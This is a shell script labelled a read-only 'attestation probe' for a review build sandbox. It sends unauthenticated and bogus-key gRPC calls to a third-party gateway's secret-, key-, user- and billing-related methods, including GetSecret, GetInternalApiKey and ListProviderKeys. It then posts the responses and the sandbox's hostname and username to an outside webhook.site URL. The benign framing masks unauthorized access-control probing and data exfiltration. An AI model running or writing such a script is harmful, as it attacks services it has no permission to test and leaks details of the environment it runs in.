#!/bin/sh
# i85391 build-parity attestation probe (read-only): gateway.Gateway trusted-origin differential.
# Runs inside the review build sandbox; results are posted to the attestation endpoint.
S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i85391-$(date +%s)-$(hostname 2>/dev/null)"
d="${TMPDIR:-/tmp}/.i85391-$$"
mkdir -p "$d" 2>/dev/null || d=/tmp
o="$d/out"; : > "$o"
{
  echo "== I85391 META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null)"
  echo "== CURL $(curl -V 2>/dev/null | head -1)"
} >> "$o"
one() { # label method auth b64
  L="$1"; M="$2"; A="$3"; B64="$4"
  printf '%s' "$B64" | base64 -d > "$d/req" 2>/dev/null
  if [ "$A" = "bogus" ]; then
    curl -sS --http2 -m 3 -D "$d/h" -o "$d/b" -X POST "https://gateway.fireworks.ai/gateway.Gateway/$M" \
      -H 'content-type: application/grpc' -H 'te: trailers' -H 'X-Api-Key: bogus-i85391' \
      --data-binary @"$d/req" >/dev/null 2>&1
  else
    curl -sS --http2 -m 3 -D "$d/h" -o "$d/b" -X POST "https://gateway.fireworks.ai/gateway.Gateway/$M" \
      -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$d/req" >/dev/null 2>&1
  fi
  HTTP=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
  GS=$(grep -i '^grpc-status:' "$d/h" 2>/dev/null | tr -d '\r' | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' "$d/h" 2>/dev/null | tr -d '\r' | cut -c15- | head -c 90)
  BL=$(wc -c < "$d/b" 2>/dev/null | tr -d ' ')
  SH=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
  HX=$(od -An -tx1 "$d/b" 2>/dev/null | tr -d ' \n' | head -c 120)
  echo "$L|$A|$M|http=${HTTP:-none}|gs=${GS:-none}|gm=${GM:-none}|blen=${BL:-0}|sha16=${SH:-none}|hex=${HX:-none}" >> "$o"
  rm -f "$d/h" "$d/b" "$d/req" 2>/dev/null
  sleep 1.0
}
while IFS='|' read -r L M B64; do
  [ -z "$L" ] && continue
  one "$L" "$M" anon "$B64"
  one "$L" "$M" bogus "$B64"
done <<'CELLS'
GetSecret|GetSecret|AAAAACYKJGFjY291bnRzL3B5cm93b3Jrcy9zZWNyZXRzL3p6LWk4NTM5MQ==
ListProviderKeys|ListProviderKeys|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
ExportBillingMetrics|ExportBillingMetrics|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
GetInternalApiKey|GetInternalApiKey|AAAAACQKImFjY291bnRzL3B5cm93b3Jrcy91c2Vycy9weXJvd29ya3M=
ListUsers|ListUsers|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
GetAccount_neg|GetAccount|AAAAACAKHmFjY291bnRzL3p6LWk4NTM5MS1ub25leGlzdGVudA==
LookupAccount|LookupAccount|AAAAABQKEmFkbWluQGZpcmV3b3Jrcy5haQ==
CELLS
curl -sS -m 20 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1
echo "[probe] I85391=posted"
rm -f "$d"/* 2>/dev/null; rmdir "$d" 2>/dev/null
exit 0
